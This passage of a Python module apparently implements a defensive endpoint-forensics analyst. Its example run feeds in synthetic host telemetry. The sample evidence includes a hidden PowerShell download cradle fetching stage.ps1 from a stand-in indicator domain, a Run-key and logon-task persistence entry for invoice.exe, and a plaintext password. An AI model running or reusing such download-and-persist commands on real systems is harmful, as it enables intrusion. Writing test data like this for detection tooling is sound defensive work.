                "specialist": "GOVERNANCE / HUMAN_REVIEW",
                "privacy": "POLICY_BOUNDARY",
            },
        ]

        specialist_handoffs = [
            {"specialist": "INCIDENTINT", "reason": "Enterprise incident sequence, root cause, impact, containment, response."},
            {"specialist": "LOGINT", "reason": "Large-scale log normalization, retention, collection changes, duplicate suppression."},
            {"specialist": "MALINT", "reason": "Malware family, capabilities, behavior, and safe sandbox analysis."},
            {"specialist": "VULNINT", "reason": "Whether installed product/version/configuration is vulnerable; HOSTINT does not infer exploitation."},
            {"specialist": "CREDINT", "reason": "Credential exposure handling without credential use."},
            {"specialist": "NETINT", "reason": "Deep PCAP/NetFlow/Zeek/firewall relationship analysis."},
            {"specialist": "DOMAININT / DNSINT", "reason": "Domain/DNS historical and infrastructure context."},
            {"specialist": "CTI / THREATACTORINT", "reason": "Threat actor, campaign, malware family, and attribution evidence."},
            {"specialist": "TTPINT", "reason": "Deep ATT&CK technique/procedure interpretation."},
            {"specialist": "PACKAGEINT", "reason": "Package ecosystem and dependency context."},
            {"specialist": "CLOUDINT", "reason": "Cloud workload, identity, storage, and control-plane forensics."},
            {"specialist": "FORENSICINT", "reason": "Forensic artifact preservation, chain of custody, and disk/memory interpretation."},
        ]

        privacy_flags = [
            "AUTHORIZED_ENDPOINT_ONLY",
            "PASSIVE_FIRST_DEFAULT",
            "READ_ONLY_DEFAULT",
            "NO_CREDENTIAL_DUMP",
            "NO_SECRET_DISPLAY",
            "REDACTED_COMMAND_LINES",
            "ACCOUNT_NOT_PERSON",
            "HOSTNAME_NOT_HOST_IDENTITY",
            "IP_NOT_HOST_IDENTITY",
            "NO_REAL_PERSON_AUTONOMOUS_ATTRIBUTION",
            "NO_OFFENSIVE_ENDPOINT_ACTION",
        ]

        limitations = [
            "HOSTINT analyzes supplied authorized endpoint evidence representations only.",
            "It does not access unauthorized hosts, exploit, deploy malware, install persistence, dump credentials, disable security controls, or perform destructive remediation.",
            "Process name alone does not establish program identity.",
            "File presence does not prove execution.",
            "Execution does not prove maliciousness, intent, or user attribution.",
            "Service/task presence does not prove malicious persistence.",
            "Connection/DNS does not prove C2 or exfiltration.",
            "IOC match requires freshness, provenance, and behavior context.",
            "ATT&CK mapping is behavior interpretation, not actor attribution.",
            "Security control degradation does not automatically prove tampering.",
            "Baseline differences may reflect legitimate change, update, administration, peer difference, or data artifact.",
        ]

        status = "COMPLETED" if hosts or processes or files or connections else "INSUFFICIENT_DATA"

        result: Dict[str, Any] = {
            "case_id": case_id,
            "task_id": task_id,
            "objective": objective,
            "status": status,
            "model_mode": self.model_mode,
            "questions": scope.get("questions", []),
            "authorized_scope": scope,
            "source_ids": sorted({ev.source_id for ev in evidences}),
            "evidence_ids": sorted({ev.evidence_id for ev in evidences}),
            "hosts": [asdict(h) for h in hosts],
            "host_eras": [asdict(era) for h in hosts for era in h.host_eras],
            "asset_ids": sorted({h.asset_id for h in hosts if h.asset_id}),
            "hostnames": sorted({h.hostname for h in hosts if h.hostname}),
            "device_ids": sorted({h.device_id for h in hosts if h.device_id}),
            "hardware": [h.hardware_model for h in hosts if h.hardware_model],
            "firmware": [h.firmware_version for h in hosts if h.firmware_version],
            "operating_systems": sorted({h.os_family for h in hosts if h.os_family}),
            "os_versions": sorted({h.os_version for h in hosts if h.os_version}),
            "os_builds": sorted({h.os_build for h in hosts if h.os_build}),
            "kernels": sorted({h.kernel_version for h in hosts if h.kernel_version}),
            "boot_context": {
                "note": "Boot context is represented through host eras, process/service timing, and supplied startup artifacts.",
                "host_eras": [asdict(era) for h in hosts for era in h.host_eras],
            },
            "users": sorted({p.user_context for p in processes if p.user_context}),
            "accounts": sorted({p.user_context for p in processes if p.user_context}),
            "sessions": [
                {
                    "process_id": p.process_id,
                    "user_context": p.user_context,
                    "privilege_context": p.privilege_context,
                    "start_time": p.start_time,
                }
                for p in processes
                if p.user_context
            ],
            "privilege_context": sorted({p.privilege_context for p in processes if p.privilege_context}),
            "processes": [asdict(p) for p in processes],
            "process_trees": [
                {
                    "parent_process_id": p.parent_process_id,
                    "process_id": p.process_id,
                    "image": p.image,
                    "path": p.path,
                    "pid": p.pid,
                    "ppid": p.ppid,
                    "start_time": p.start_time,
                    "user_context": p.user_context,
                }
                for p in processes
            ],
            "services": [asdict(s) for s in services],
            "scheduled_tasks": [asdict(t) for t in tasks],
            "drivers": generic.get("drivers", []),
            "modules": generic.get("modules", []),
            "files": [asdict(f) for f in files],
            "file_hashes": sorted({f.sha256 for f in files if f.sha256}),
            "signatures": {
                f.file_id: {
                    "publisher": f.publisher,
                    "signature_valid": f.signature_valid,
                }
                for f in files
            },
            "registry_artifacts": generic.get("registry_artifacts", []),
            "configurations": generic.get("configurations", []),
            "installed_software": generic.get("installed_software", []) + generic.get("software", []),
            "packages": generic.get("packages", []),
            "patch_states": generic.get("patches", []),
            "security_controls": [asdict(c) for c in controls],
            "edr_states": [asdict(c) for c in controls if c.control_type == "EDR"],
            "av_states": [asdict(c) for c in controls if c.control_type == "AV"],
            "firewall_states": [asdict(c) for c in controls if c.control_type == "FIREWALL"],
            "network_interfaces": generic.get("network_interfaces", []),
            "connections": [asdict(c) for c in connections],
            "sockets": generic.get("sockets", []),
            "dns_artifacts": [asdict(d) for d in dns],
            "mounts": generic.get("mounts", []),
            "storage": generic.get("storage", []),
            "usb_devices": generic.get("usb_devices", []),
            "containers": generic.get("containers", []),
            "virtual_machines": generic.get("virtual_machines", []),
            "execution_history": generic.get("execution_history", []),
            "startup_artifacts": generic.get("startup_artifacts", []),
            "persistence_candidates": [asdict(p) for p in persistence],
            "baselines": [asdict(b) for b in baselines],
            "changes": [asdict(c) for c in changes],
            "host_anomalies": [asdict(a) for a in anomalies],
            "ioc_matches": [asdict(m) for m in ioc_matches],
            "ioc_freshness": {m.ioc_id: m.freshness.name for m in ioc_matches},
            "ttp_mappings": [asdict(t) for t in ttps],
            "attack_techniques": sorted({t.technique_id for t in ttps}),
            "incident_context": incident_context,
            "forensic_timeline": [
                {
                    "timestamp": ts,
                    "description": desc,
                }
                for ts, desc in sorted(
                    [
                        (p.start_time.isoformat(), f"PROCESS_START {p.image or p.path} pid={p.pid}")
                        for p in processes
                        if p.start_time
                    ]
                    + [
                        (f.created_at.isoformat(), f"FILE_CREATED {f.path}")
                        for f in files
                        if f.created_at
                    ]
                    + [
                        (s.created_at.isoformat(), f"SERVICE_CREATED {s.name}")
                        for s in services
                        if s.created_at
                    ]
                    + [
                        (t.created_at.isoformat(), f"TASK_CREATED {t.name}")
                        for t in tasks
                        if t.created_at
                    ]
                    + [
                        (c.start_time.isoformat(), f"CONNECTION {c.remote_domain or c.remote_ip}:{c.remote_port}")
                        for c in connections
                        if c.start_time
                    ]
                    + [
                        (d.timestamp.isoformat(), f"DNS {d.queried_domain}")
                        for d in dns
                        if d.timestamp
                    ]
                    + [
                        (a.detection_time.isoformat(), f"ALERT {a.alert_name}")
                        for a in deduped_alerts
                        if a.detection_time
                    ],
                    key=lambda x: x[0],
                )
            ],
            "security_alerts": [asdict(a) for a in deduped_alerts],
            "alert_duplicate_log": alert_duplicate_log,
            "candidate_compromise": compromise_details,
            "compromise_state": compromise_state.name,
            "timeline_updates": [
                {
                    "timestamp": p.start_time,
                    "type": "PROCESS_START",
                    "object_id": p.process_id,
                }
                for p in processes
                if p.start_time
            ],
            "observations": [asdict(ev) for ev in evidences],
            "candidate_facts": [asdict(f) for f in facts if f.verification_state == VerificationState.INCONCLUSIVE],
            "supported_facts": [asdict(f) for f in facts if f.verification_state == VerificationState.SUPPORTED],
            "partial_facts": [asdict(f) for f in facts if f.verification_state == VerificationState.PARTIALLY_SUPPORTED],
            "disputed_facts": [asdict(f) for f in facts if f.verification_state in (VerificationState.DISPUTED, VerificationState.UNSUPPORTED)],
            "source_reliability": {
                ev.source_id: {
                    "source_type": ev.source_type,
                    "reliability": ev.reliability,
                    "upstream_source_id": ev.upstream_source_id,
                }
                for ev in evidences
            },
            "source_bias": [
                "EDR sensors have blind spots and agent health variability.",
                "Log retention and collection changes can create apparent increases/decreases.",
                "CMDB/MDM inventory may be stale.",
                "Threat feeds may contain stale, duplicated, or context-dependent IOCs.",
                "User reports and scanners are lower-authority sources.",
            ],
            "source_limitations": [
                "No unauthorized endpoint access.",
                "No credential use or password cracking.",
                "No live destructive action.",
                "No autonomous remediation.",
            ],
            "source_pedigree": {
                ev.evidence_id: {
                    "source_id": ev.source_id,
                    "upstream_source_id": ev.upstream_source_id,
                    "source_type": ev.source_type,
                    "observed_at": ev.observed_at,
                    "ingested_at": ev.ingested_at,
                }
                for ev in evidences
            },
            "source_independence": source_independence,
            "contradictions": contradictions,
            "hypotheses": [asdict(h) for h in hypotheses],
            "falsification_results": {
                "questions": [
                    "Could process be legitimate admin activity?",
                    "Could file be vendor-signed and expected?",
                    "Could event belong to older host era?",
                    "Could connection be generated by security software?",
                    "Could alert be from authorized test activity?",
                    "Could suspicious task be software updater?",
                    "Could IOC be stale?",
                ],
                "skeptic_review": skeptic,
            },
            "privacy_flags": privacy_flags,
            "unknowns": [
                "Real-person operator identity remains unresolved.",
                "Intent remains unresolved.",
                "Maliciousness remains unresolved unless separately established by MALINT/INCIDENTINT/CTI context.",
                "Full incident scope remains unresolved.",
                "Threat actor / campaign attribution remains unresolved.",
                "Whether network activity constituted exfiltration remains unresolved.",
            ],
            "knowledge_gaps": gaps,
            "recommended_next_actions": recommended_next_actions,
            "specialist_handoffs": specialist_handoffs,
            "limitations": limitations,
            "analyst_summary": analyst_summary,
            "graphical_memory": graph,
            "replay_manifest": {
                "case_id": case_id,
                "task_id": task_id,
                "model_mode": self.model_mode,
                "generated_at": now.isoformat(),
                "evidence_ids": sorted({ev.evidence_id for ev in evidences}),
                "host_ids": [h.host_id for h in hosts],
                "host_era_ids": [era.era_id for h in hosts for era in h.host_eras],
                "process_ids": [p.process_id for p in processes],
                "file_ids": [f.file_id for f in files],
                "connection_ids": [c.connection_id for c in connections],
                "ioc_match_ids": [m.match_id for m in ioc_matches],
                "tool_parser_versions": {
                    ev.evidence_id: {
                        "source_type": ev.source_type,
                        "source_id": ev.source_id,
                        "upstream_source_id": ev.upstream_source_id,
                    }
                    for ev in evidences
                },
                "normalization_logic": {
                    "time": "UTC normalized where parseable; original event/ingest times preserved where supplied",
                    "command_lines": "redacted for credential/secret protection",
                    "host_identity": "stable IDs preferred; hostname/IP treated as weak identifiers",
                    "ioc": "embedded/present indicator separated from observed connection/DNS/process behavior",
                    "ttp": "behavior-first mapping; no actor attribution",
                },
                "fact_gate": [asdict(f) for f in facts],
                "contradictions": contradictions,
                "hypotheses": [asdict(h) for h in hypotheses],
                "skeptic_review": skeptic,
                "compromise_assessment": compromise_details,
            },
        }

        logger.info(
            "HOSTINT case completed. hosts=%s processes=%s files=%s connections=%s ioc_matches=%s compromise=%s",
            len(hosts),
            len(processes),
            len(files),
            len(connections),
            len(ioc_matches),
            compromise_state.name,
        )

        return result


# ==============================================================================
# EXAMPLE EXECUTION
# ==============================================================================

if __name__ == "__main__":
    analyst = HostIntEmployee(model_mode="LOCAL_ONLY")

    case_id = "CASE_HOST_001"
    task_id = "TASK_ENDPOINT_SUSPICIOUS_EXECUTION_001"

    objective = (
        "Analyze authorized endpoint telemetry for host WS-ENG-01 to resolve host identity, "
        "process execution, file activity, persistence indicators, network context, IOC correlation, "
        "baseline differences, and compromise status. Do not exploit, dump credentials, disable EDR, "
        "install persistence, or attribute a real person without independent authorized evidence and human review."
    )

    scope = {
        "mode": "AUTHORIZED_PASSIVE",
        "questions": [
            "Which host identity and host era are resolved?",
            "Which processes executed and what is the process tree?",
            "Which files/services/tasks have suspicious context?",
            "Which IOCs are current and observed?",
            "What baseline differences exist?",
            "What security-control state existed during the event window?",
            "What compromise state is supported?",
            "What remains unknown?",
        ],
        "allow_exploitation": False,
        "allow_credential_dump": False,
        "allow_disable_edr": False,
        "allow_install_persistence": False,
        "allow_lateral_movement": False,
        "allow_privilege_escalation": False,
    }

    evidence_input = {
        "hosts": [
            {
                "host_id": "HOST_WS_ENG_01",
                "asset_id": "AST-WS-ENG-01",
                "hostname": "WS-ENG-01",
                "device_id": "DEV-UUID-9F2C-44AA",
                "serial_reference": "SERIAL-REDACTED-001",
                "platform": "Windows",
                "os_family": "Windows 11",
                "os_version": "23H2",
                "os_build": "22631.4391",
                "kernel_version": "10.0.22631",
                "architecture": "x64",
                "hardware_model": "Dell Latitude 5540",
                "firmware_version": "1.12.0",
                "domain_or_tenant": "corp.example",
                "business_owner": "Engineering",
                "technical_owner": "IT Endpoint Ops",
                "criticality": "HIGH",
                "first_seen": "2026-01-10T00:00:00Z",
                "last_seen": "2026-10-09T00:00:00Z",
                "status": "ACTIVE",
                "source_type": "cmdb",
                "source_id": "SRC_CMDB_01",
                "upstream_source_id": "CMDB_WS_ENG_01",
                "host_eras": [
                    {
                        "era_id": "HE-3",
                        "state": "CURRENT",
                        "valid_from": "2026-08-01T00:00:00Z",
                        "valid_to": "2026-10-09T00:00:00Z",
                        "trigger": "reimage_2026_08_01",
                        "source_type": "mdm",
                        "source_id": "SRC_MDM_01",
                        "upstream_source_id": "MDM_WS_ENG_01",
                    }
                ],
            }
        ],
        "processes": [
            {
                "process_id": "PROC_EXPLORER",
                "host_id": "HOST_WS_ENG_01",
                "host_era_id": "HE-3",
                "pid": 4100,
                "ppid": 3900,
                "image": "explorer.exe",
                "path": "C:\\Windows\\Explorer.exe",
                "command_line": "C:\\Windows\\Explorer.exe",
                "user_context": "U",
                "privilege_context": "standard_user",
                "start_time": "2026-10-08T09:00:00Z",
                "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
                "signature_context": {"publisher": "Microsoft Windows", "valid": True},
                "source_type": "edr",
                "source_id": "SRC_EDR_01",
                "upstream_source_id": "EDR_EVENT_1001",
            },
            {
                "process_id": "PROC_POWERSHELL",
                "host_id": "HOST_WS_ENG_01",
                "host_era_id": "HE-3",
                "pid": 5210,
                "ppid": 4100,
                "image": "powershell.exe",
                "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "command_line": "powershell.exe -nop -w hidden -c \"Invoke-WebRequest -Uri https://indicator.example/stage.ps1 -OutFile C:\\Users\\U\\AppData\\Local\\Temp\\stage.ps1; password=SuperSecret123\"",
                "user_context": "U",
                "privilege_context": "standard_user",
                "start_time": "2026-10-08T10:15:00Z",
                "sha256": "a3f5b9c8d1e2f4a6b8c0d2e4f6a8b0c2d4e6f8a0b2c4d6e8f0a2b4c6d8e0f2a4",
                "signature_context": {"publisher": "Microsoft Windows", "valid": True},
                "source_type": "edr",
                "source_id": "SRC_EDR_01",
                "upstream_source_id": "EDR_EVENT_1042",
            },
            {
                "process_id": "PROC_INVOICE",
                "host_id": "HOST_WS_ENG_01",
                "host_era_id": "HE-3",
                "pid": 5288,
                "ppid": 5210,
                "image": "invoice.exe",
                "path": "C:\\Users\\U\\AppData\\Local\\Temp\\invoice.exe",
                "command_line": "C:\\Users\\U\\AppData\\Local\\Temp\\invoice.exe --mode sync",
                "user_context": "U",
                "privilege_context": "standard_user",
                "start_time": "2026-10-08T10:16:00Z",
                "sha256": "b4e6c0d2e4f6a8b0c2d4e6f8a0b2c4d6e8f0a2b4c6d8e0f2a4b6c8d0e2f4a6b8",
                "signature_context": {"publisher": None, "valid": False},
                "source_type": "edr",
                "source_id": "SRC_EDR_01",
                "upstream_source_id": "EDR_EVENT_1043",
            },
        ],
        "services": [
            {
                "service_id": "SVC_UPDATER",
                "host_id": "HOST_WS_ENG_01",
                "name": "ContosoUpdaterSvc",
                "display_name": "Contoso Updater Service",
                "binary_path": "C:\\ProgramData\\Contoso\\updater.exe",
                "start_type": "auto",
                "account": "LocalSystem",
                "state": "running",
                "created_at": "2026-10-08T10:20:00Z",
                "modified_at": "2026-10-08T10:20:00Z",
                "sha256": "c5f7d1e3f5a7b9c1d3e5f7a9b1c3d5e7f9a1b3c5d7e9f1a3b5c7d9e1f3a5b7c9",
                "publisher": None,
                "signature_valid": None,
                "source_type": "configuration_management",
                "source_id": "SRC_CFG_01",
                "upstream_source_id": "CFG_WS_ENG_01",
            },
            {
                "service_id": "SVC_WINDOWS_UPDATE",
                "host_id": "HOST_WS_ENG_01",
                "name": "wuauserv",
                "display_name": "Windows Update",
                "binary_path": "C:\\WINDOWS\\system32\\svchost.exe -k netsvcs",
                "start_type": "manual",
                "account": "LocalSystem",
                "state": "running",
                "created_at": "2026-08-01T00:00:00Z",
                "modified_at": "2026-08-01T00:00:00Z",
                "sha256": None,
                "publisher": "Microsoft Windows",
                "signature_valid": True,
                "source_type": "osquery",
                "source_id": "SRC_OSQ_01",
                "upstream_source_id": "OSQ_WS_ENG_01",
            },
        ],
        "scheduled_tasks": [
            {
                "task_id": "TASK_OFFICE_SYNC",
                "host_id": "HOST_WS_ENG_01",
                "name": "OfficeBackgroundTaskHandlerRegistration",
                "schedule": "daily",
                "action": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OfficeBackgroundTaskHandlerRegistration.exe",
                "principal": "U",
                "created_at": "2026-08-01T00:00:00Z",
                "modified_at": "2026-08-01T00:00:00Z",
                "state": "enabled",
                "source_type": "configuration_management",
                "source_id": "SRC_CFG_01",
                "upstream_source_id": "CFG_WS_ENG_01",
            },
            {
                "task_id": "TASK_TEMP_SYNC",
                "host_id": "HOST_WS_ENG_01",
                "name": "TempSyncHelper",
                "schedule": "at_logon",
                "action": "C:\\Users\\U\\AppData\\Local\\Temp\\invoice.exe --sync",
                "principal": "U",
                "created_at": "2026-10-08T10:18:00Z",
                "modified_at": "2026-10-08T10:18:00Z",
                "state": "enabled",
                "source_type": "edr",
                "source_id": "SRC_EDR_01",
                "upstream_source_id": "EDR_EVENT_1050",
            },
        ],
        "files": [
            {
                "file_id": "FILE_STAGE_PS1",
                "host_id": "HOST_WS_ENG_01",
                "path": "C:\\Users\\U\\AppData\\Local\\Temp\\stage.ps1",
                "filename": "stage.ps1",
                "size": 4096,
                "sha256": "d6e8c0d2e4f6a8b0c2d4e6f8a0b2c4d6e8f0a2b4c6d8e0f2a4b6c8d0e2f4a6b8",
                "created_at": "2026-10-08T10:15:30Z",
                "modified_at": "2026-10-08T10:15:30Z",
                "owner": "U",
                "publisher": None,
                "signature_valid": None,
                "mime_type": "text/plain",
                "first_seen": "2026-10-08T10:15:30Z",
                "last_seen": "2026-10-08T22:00:00Z",
                "embedded_iocs": ["https://indicator.example/stage.ps1", "indicator.example"],
                "source_type": "filesystem_metadata",
                "source_id": "SRC_FS_01",
                "upstream_source_id": "FS_WS_ENG_01",
            },
            {
                "file_id": "FILE_INVOICE_EXE",
                "host_id": "HOST_WS_ENG_01",
                "path": "C:\\Users\\U\\AppData\\Local\\Temp\\invoice.exe",
                "filename": "invoice.exe",
                "size": 1048576,
                "sha256": "b4e6c0d2e4f6a8b0c2d4e6f8a0b2c4d6e8f0a2b4c6d8e0f2a4b6c8d0e2f4a6b8",
                "created_at": "2026-10-08T10:15:45Z",
                "modified_at": "2026-10-08T10:15:45Z",
                "owner": "U",
                "publisher": None,
                "signature_valid": False,
                "mime_type": "application/octet-stream",
                "first_seen": "2026-10-08T10:15:45Z",
                "last_seen": "2026-10-08T22:00:00Z",
                "embedded_iocs": ["203.0.113.45", "indicator.example"],
                "source_type": "edr",
                "source_id": "SRC_EDR_01",
                "upstream_source_id": "EDR_EVENT_1044",
            },
        ],
        "security_controls": [
            {
                "control_id": "CTRL_EDR",
                "host_id": "HOST_WS_ENG_01",
                "control_type": "EDR",
                "product": "ExampleEDR",
                "version": "7.4.1",
                "state": "ACTIVE",
                "last_updated": "2026-10-08T22:00:00Z",
                "healthy": True,
                "policy": "corp-standard",
                "source_type": "mdm",
                "source_id": "SRC_MDM_01",
                "upstream_source_id": "MDM_WS_ENG_01",
            },
            {
                "control_id": "CTRL_AV",
                "host_id": "HOST_WS_ENG_01",
                "control_type": "AV",
                "product": "ExampleAV",
                "version": "4.2.0",
                "state": "ACTIVE",
                "last_updated": "2026-10-08T21:55:00Z",
                "healthy": True,
                "policy": "corp-standard",
                "source_type": "av_telemetry",
                "source_id": "SRC_AV_01",
                "upstream_source_id": "AV_WS_ENG_01",
            },
            {
                "control_id": "CTRL_FIREWALL",
                "host_id": "HOST_WS_ENG_01",
                "control_type": "FIREWALL",
                "product": "Windows Firewall",
                "version": None,
                "state": "ACTIVE",
                "last_updated": "2026-10-08T22:00:00Z",
                "healthy": True,
                "policy": "domain",
                "source_type": "firewall_telemetry",
                "source_id": "SRC_FW_01",
                "upstream_source_id": "FW_WS_ENG_01",
            },
        ],
        "connections": [
            {
                "connection_id": "CONN_INDICATOR_IP",
                "host_id": "HOST_WS_ENG_01",
                "local_pid": 5288,
                "local_endpoint": "10.0.0.25:49711",
                "remote_ip": "203.0.113.45",
                "remote_domain": "indicator.example",
                "remote_port": 443,
                "protocol": "TCP",
                "state": "established",
                "bytes_sent": 184320,
                "bytes_received": 2048,
                "start_time": "2026-10-08T10:16:04Z",
                "end_time": "2026-10-08T10:16:18Z",
                "source_type": "edr",
                "source_id": "SRC_EDR_01",
                "upstream_source_id": "EDR_EVENT_1045",
            },
            {
                "connection_id": "CONN_WINDOWS_UPDATE",
                "host_id": "HOST_WS_ENG_01",
                "local_pid": 1200,
                "local_endpoint": "10.0.0.25:49800",
                "remote_ip": None,
                "remote_domain": "download.windowsupdate.com",
                "remote_port": 443,
                "protocol": "TCP",
                "state": "established",
                "bytes_sent": 1024,
                "bytes_received": 52428800,
                "start_time": "2026-10-08T09:30:00Z",
                "end_time": "2026-10-08T09:35:00Z",
                "source_type": "firewall_telemetry",
                "source_id": "SRC_FW_01",
                "upstream_source_id": "FW_WS_ENG_01",
            },
        ],
        "dns_artifacts": [
            {
                "dns_id": "DNS_INDICATOR",
                "host_id": "HOST_WS_ENG_01",
                "process_id": "PROC_INVOICE",
                "queried_domain": "indicator.example",
                "resolved_ips": ["203.0.113.45"],
                "query_type": "A",
                "timestamp": "2026-10-08T10:16:02Z",
                "source_type": "edr",
                "source_id": "SRC_EDR_01",
                "upstream_source_id": "EDR_EVENT_1046",
            }
        ],
        "alerts": [
            {
                "alert_id": "ALERT_SUSPICIOUS_POWERSHELL",
                "host_id": "HOST_WS_ENG_01",
                "alert_name": "Suspicious PowerShell Download Cradle",
                "rule": "EDR-PWSH-DL-CRADLE-001",
                "severity": "HIGH",
                "detection_time": "2026-10-08T10:15:05Z",
                "process_id": "PROC_POWERSHELL",
                "upstream_event_id": "UPSTREAM_EDR_1042",
                "correlation_id": "CORR_1042",
                "status": "open",
                "source_type": "edr",
                "source_id": "SRC_EDR_01",
                "upstream_source_id": "EDR_EVENT_1042",
            },
            {
                "alert_id": "ALERT_SUSPICIOUS_POWERSHELL_SIEM",
                "host_id": "HOST_WS_ENG_01",
                "alert_name": "Suspicious PowerShell Download Cradle",
                "rule": "SIEM-EDR-PWSH-001",
                "severity": "HIGH",
                "detection_time": "2026-10-08T10:15:20Z",
                "process_id": "PROC_POWERSHELL",
                "upstream_event_id": "UPSTREAM_EDR_1042",
                "correlation_id": "CORR_1042",
                "status": "open",
                "source_type": "siem",
                "source_id": "SRC_SIEM_01",
                "upstream_source_id": "EDR_EVENT_1042",
            },
            {
                "alert_id": "ALERT_OUTBOUND_IOC",
                "host_id": "HOST_WS_ENG_01",
                "alert_name": "Outbound Connection to Known Indicator",
                "rule": "NET-IOC-014",
                "severity": "HIGH",
                "detection_time": "2026-10-08T10:16:05Z",
                "process_id": "PROC_INVOICE",
                "ioc": "203.0.113.45",
                "upstream_event_id": "UPSTREAM_EDR_1045",
                "correlation_id": "CORR_1045",
                "status": "open",
                "source_type": "edr",
                "source_id": "SRC_EDR_01",
                "upstream_source_id": "EDR_EVENT_1045",
            },
        ],
        "iocs": [
            {
                "ioc_id": "IOC_HASH_INVOICE",
                "ioc_type": "sha256",
                "value": "b4e6c0d2e4f6a8b0c2d4e6f8a0b2c4d6e8f0a2b4c6d8e0f2a4b6c8d0e2f4a6b8",
                "first_published": "2026-10-07T00:00:00Z",
                "last_updated": "2026-10-08T00:00:00Z",
                "current_status": "active",
                "source": "ExampleCTI",
                "campaign": "ExampleCampaign-A",
                "malware_family": "ExampleLoader",
                "confidence": 0.85,
                "source_type": "threat_feed",
                "source_id": "SRC_CTI_01",
                "upstream_source_id": "CTI_FEED_A",
            },
            {
                "ioc_id": "IOC_DOMAIN_INDICATOR",
                "ioc_type": "domain",
                "value": "indicator.example",
                "first_published": "2026-10-06T00:00:00Z",
                "last_updated": "2026-10-08T00:00:00Z",
                "current_status": "active",
                "source": "ExampleCTI",
                "campaign": "ExampleCampaign-A",
                "malware_family": "ExampleLoader",
                "confidence": 0.82,
                "source_type": "threat_feed",
                "source_id": "SRC_CTI_01",
                "upstream_source_id": "CTI_FEED_A",
            },
            {
                "ioc_id": "IOC_IP_INDICATOR",
                "ioc_type": "ip",
                "value": "203.0.113.45",
                "first_published": "2026-10-06T00:00:00Z",
                "last_updated": "2026-10-08T00:00:00Z",
                "current_status": "active",
                "source": "ExampleCTI",
                "campaign": "ExampleCampaign-A",
                "malware_family": "ExampleLoader",
                "confidence": 0.80,
                "source_type": "threat_feed",
                "source_id": "SRC_CTI_01",
                "upstream_source_id": "CTI_FEED_A",
            },
            {
                "ioc_id": "IOC_STALE_HASH",
                "ioc_type": "sha256",
                "value": "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
                "first_published": "2024-01-01T00:00:00Z",
                "last_updated": "2024-01-01T00:00:00Z",
                "current_status": "expired",
                "source": "ExampleCTI",
                "campaign": None,
                "malware_family": None,
                "confidence": 0.40,
                "source_type": "threat_feed",
                "source_id": "SRC_CTI_01",
                "upstream_source_id": "CTI_FEED_A",
            },
        ],
        "baselines": [
            {
                "baseline_id": "BASE_WS_ENG_GOLD",
                "host_id": "HOST_WS_ENG_01",
                "version": "2026-08-01-gold",
                "expected_software": ["Microsoft Office", "Chrome", "VS Code", "Contoso Legit App"],
                "expected_services": ["wuauserv", "Spooler", "ExampleEDRService", "ExampleAVService"],
                "expected_tasks": ["OfficeBackgroundTaskHandlerRegistration"],
                "expected_ports": [80, 443, 53, 123],
                "expected_processes": ["explorer.exe", "chrome.exe", "Code.exe", "WINWORD.EXE", "powershell.exe"],
                "expected_users": ["U", "SYSTEM", "LOCAL SERVICE", "NETWORK SERVICE"],
                "normal_connections": ["download.windowsupdate.com", "corp.example", "examplecdn.example"],
                "source": "gold_image",
                "valid_from": "2026-08-01T00:00:00Z",
                "valid_to": "2026-10-09T00:00:00Z",
                "source_type": "configuration_management",
                "source_id": "SRC_GOLD_01",
                "upstream_source_id": "GOLD_IMAGE_WS_ENG",
            }
        ],
        "registry_artifacts": [
            {
                "artifact_id": "REG_RUN_TEMP_SYNC",
                "host_id": "HOST_WS_ENG_01",
                "key": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "value": "TempSyncHelper=C:\\Users\\U\\AppData\\Local\\Temp\\invoice.exe --sync",
                "last_written": "2026-10-08T10:18:00Z",
                "source_type": "registry_export",
                "source_id": "SRC_REG_01",
                "upstream_source_id": "REG_WS_ENG_01",
            }
        ],
        "software": [
            {
                "software_id": "SW_CONTOSO_UPDATER",
                "host_id": "HOST_WS_ENG_01",
                "name": "Contoso Updater",
                "version": "1.0.0",
                "install_date": "2026-10-08T10:20:00Z",
                "publisher": None,
                "source_type": "software_inventory",
                "source_id": "SRC_SW_01",
                "upstream_source_id": "SW_WS_ENG_01",
            }
        ],
        "patches": [
            {
                "patch_id": "PATCH_KB5041585",
                "host_id": "HOST_WS_ENG_01",
                "name": "KB5041585",
                "installed_at": "2026-09-15T00:00:00Z",
                "status": "installed",
                "source_type": "patch_management",
                "source_id": "SRC_PATCH_01",
                "upstream_source_id": "PATCH_WS_ENG_01",
            }
        ],
        "usb_devices": [
            {
                "artifact_id": "USB_001",
                "host_id": "HOST_WS_ENG_01",
                "serial": "USB-REDAC-001",
                "vendor": "Acme",
                "product": "FlashDrive",
                "first_seen": "2026-10-08T10:25:00Z",
                "last_seen": "2026-10-08T10:35:00Z",
                "source_type": "registry_export",
                "source_id": "SRC_REG_01",
                "upstream_source_id": "REG_WS_ENG_01",
            }
        ],
        "incident_context": {
            "suspected_incident": True,
            "incident_id": "INC-2026-1008-001",
            "summary": "User reported unexpected browser download and subsequent suspicious process behavior.",
        },
    }

    known_facts = {
        "authorized_change_ticket": False,
        "authorized_test_activity": False,
        "software_update_window": False,
        "sinkhole_or_security_research": False,
        "credential_use_prohibited": True,
        "real_person_attribution_requires_human_review": True,
    }

    report = analyst.process_case(
        case_id=case_id,
        task_id=task_id,
        objective=objective,
        scope=scope,
        evidence_input=evidence_input,
        known_facts=known_facts,
    )

    print("\n" + "=" * 100)
    print("TRACEATLAS / HOSTINT DEFENSIVE REPORT")
    print("=" * 100)
    print(report.get("analyst_summary", ""))

    print("\n" + "=" * 100)
    print("FULL JSON RESULT")
    print("=" * 100)
    print(json.dumps(report, indent=2, default=json_serial))
    
